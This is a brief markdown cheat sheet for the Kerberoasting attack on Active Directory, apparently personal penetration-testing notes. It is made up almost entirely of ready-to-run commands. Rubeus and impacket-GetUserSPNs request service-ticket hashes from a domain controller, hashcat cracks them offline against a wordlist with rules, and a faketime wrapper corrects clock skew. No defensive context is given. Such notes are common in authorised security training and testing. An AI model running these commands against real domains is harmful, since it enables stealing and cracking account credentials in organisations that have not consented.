# Kerberoasting

__REQUIRES__

 - name of an account

Using rubeus
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

Crack SPN hash
```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Using Kali (Crack after)
```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 $domain/$user
```

Using faktime to fix clock skew
```bash
sudo faketime "$(ntpdate -q $ntp_ip | cut -d ' ' -f 1,2)" impacket-GetUserSPNs -request -dc-ip $dc_ip $domain/$un
```